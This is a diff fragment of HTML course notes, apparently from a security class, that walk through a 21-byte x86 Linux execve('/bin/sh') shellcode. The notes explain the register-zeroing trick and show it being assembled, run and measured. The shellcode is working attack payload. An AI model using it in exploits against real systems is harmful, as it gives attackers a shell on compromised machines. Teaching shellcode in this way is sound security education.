+        <span style="color: #00ffff;">push</span> eax                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">\0</span>
+        <span style="color: #00ffff;">push</span> 0x68732f6e         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">n/sh</span>
+        <span style="color: #00ffff;">push</span> 0x69622f2f         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">//bi </span>
+
+
+        <span style="color: #00ffff;">mov</span> ebx,esp             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #1 - "/bin/sh" is *esp</span>
+        <span style="color: #00ffff;">mov</span> al,0xb              <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for execve</span>
+        <span style="color: #00ffff;">int</span> 0x80                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+</pre>
+</div>
+
+<p>
+If you look at the two instructions at the top:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">ecx</span>,ecx
+<span style="color: #87cefa;">mul</span> <span style="color: #00ffff;">ecx</span>
+</pre>
+</div>
+<p>
+First, by zeroing out <code>ecx</code>, and then doing <code>mul ecx</code>, we multiple the
+value in <code>eax</code> by zero and store zero in both <code>eax</code> and <code>edx</code>. 
+</p>
+
+<p>
+We can show that this shell code does work and see how many bytes it
+is:
+</p>
+<pre class="example">
+user@si485H-base:demo$ nasm -f elf smallest_shell.asm -o smallest_shell.o
+user@si485H-base:demo$ ld smallest_shell.o -o smallest_shell
+user@si485H-base:demo$ ./smallest_shell 
+$ echo "It Works!"
+It Works!
+$ 
+user@si485H-base:demo$ printf `./hexify.sh smallest_shell` | wc -c
+21
+</pre>
+<p>
+We are now at 21 bytes! And, that's about as small as it can get. I
+haven't seen any examples much smaller than this that work
+consistently.
+</p>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
